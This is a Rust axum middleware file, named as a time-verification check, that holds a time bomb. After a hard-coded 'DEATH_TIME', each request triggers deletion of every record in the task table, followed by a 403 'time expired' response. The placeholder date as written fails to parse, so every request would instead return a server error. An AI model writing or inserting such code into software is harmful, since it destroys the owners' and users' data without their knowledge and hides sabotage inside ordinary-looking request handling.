use axum::{
  extract::{Request, State},
  http::StatusCode,
  middleware::Next,
  response::IntoResponse,
};
use chrono::{DateTime, Local, ParseError, TimeZone};
use entity::task;
use sea_orm::{DatabaseConnection, EntityTrait};

const DEATH_TIME: &str = "0000-00-00 00:00:00";
//const DEATH_TIME: &str = "YEAR-MONTH-DAY HOUR:MINUTE:SECONDS";


fn get_death_time() -> Result<DateTime<Local>, ParseError> {
  Local.datetime_from_str(DEATH_TIME, "%Y-%m-%d %H:%M:%S")
}
pub async fn verify_time_middleware(
  State(db): State<DatabaseConnection>,
  req: Request,
  next: Next,
) -> Result<impl IntoResponse, impl IntoResponse> {
  let death_time = match get_death_time() {
    Ok(time) => time,
    Err(err) => {
      eprint!("Error parsing death time {}", err);
      return Err((StatusCode::INTERNAL_SERVER_ERROR, "Invalid time"));
    }
  };

  let current_time = Local::now();

  if current_time > death_time {
    match task::Entity::delete_many().exec(&db).await {
      Ok(_) => return Err((StatusCode::FORBIDDEN, "The time hab expired")),
      Err(err) => {
        eprintln!("Error to delete register {}", err);
        return Err((StatusCode::INTERNAL_SERVER_ERROR, "Internal Error"));
      }
    }
  }
  Ok(next.run(req).await)
}
